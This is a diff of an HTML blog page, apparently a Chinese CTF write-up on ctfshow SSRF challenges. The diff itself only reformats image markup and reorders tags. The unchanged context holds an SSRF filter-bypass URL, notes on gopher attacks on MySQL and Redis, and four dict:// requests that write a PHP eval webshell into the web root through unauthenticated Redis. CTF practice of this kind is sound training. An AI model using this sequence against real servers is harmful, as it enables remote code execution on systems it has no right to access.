@@ -38,8 +38,8 @@
 <meta property="article:author" content="whistle.H">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="web">
-<meta property="article:tag" content="ctfshow">
 <meta property="article:tag" content="wp">
+<meta property="article:tag" content="ctfshow">
 <meta property="article:tag" content="ssrf">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812232408774.png">
@@ -313,30 +313,20 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;url=http://ctf.:123@127.0.0.1/flag.php?arg=.show&quot;</span></span><br></pre></td></tr></table></figure>
 <h2 id="web359gopher打mysql">web359（gopher打mysql）</h2>
 <p>主要是利用工具来打了，给了提示说打无密码的mysql</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812232408774.png" alt="image-20220812232408774" /><figcaption aria-hidden="true">image-20220812232408774</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812232408774.png" alt="image-20220812232408774" /></p>
 <p>然后直接上传，注意需要二次url编码</p>
 <p>因为此时GET会进行一次解码，然后curl中还会进行一次解码</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812232510290.png" alt="image-20220812232510290" /><figcaption aria-hidden="true">image-20220812232510290</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812232510290.png" alt="image-20220812232510290" /></p>
 <h2 id="web360gopher打redis">web360（gopher打redis）</h2>
 <p>这也可以利用工具来打</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812233607982.png" alt="image-20220812233607982" /><figcaption aria-hidden="true">image-20220812233607982</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812233607982.png" alt="image-20220812233607982" /></p>
 <p>接下来就和上一题一样直接rce梭了。</p>
 <p>不过作为练习，我们可以手动打一下尝试redis漏洞，利用dict协议探测6379端口发现存在未授权的redis服务。</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812235327973.png" alt="image-20220812235327973" /><figcaption aria-hidden="true">image-20220812235327973</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220812235327973.png" alt="image-20220812235327973" /></p>
 <p>依次设置</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?url=dict://127.0.0.1/config:set:dir:/var/www/html</span><br><span class="line">?url=dict://127.0.0.1/set:shell:&quot;\u003c\u003f\u0070\u0068\u0070\u0020\u0065\u0076\u0061\u006c\u0028\u0024\u005f\u0050\u004f\u0053\u0054\u005b\u0031\u005d\u0029\u003b\u0020\u003f\u003e&quot;</span><br><span class="line">?url=dict://127.0.0.1/config:set:dbfilename:ssrf.php</span><br><span class="line">?url=dict://127.0.0.1/save</span><br></pre></td></tr></table></figure>
 <p>这直接将马写入了数据库再保存到php文件中解析</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220813000530136.png" alt="image-20220813000530136" /><figcaption aria-hidden="true">image-20220813000530136</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0022/image-20220813000530136.png" alt="image-20220813000530136" /></p>
 <p>顺利打出rce。</p>
 
     </div>
@@ -349,8 +339,8 @@
           <div class="post-tags">
               <a href="/tags/ctf/" rel="tag"># ctf</a>
               <a href="/tags/web/" rel="tag"># web</a>
-              <a href="/tags/ctfshow/" rel="tag"># ctfshow</a>
               <a href="/tags/wp/" rel="tag"># wp</a>
+              <a href="/tags/ctfshow/" rel="tag"># ctfshow</a>
               <a href="/tags/ssrf/" rel="tag"># ssrf</a>
           </div>
 
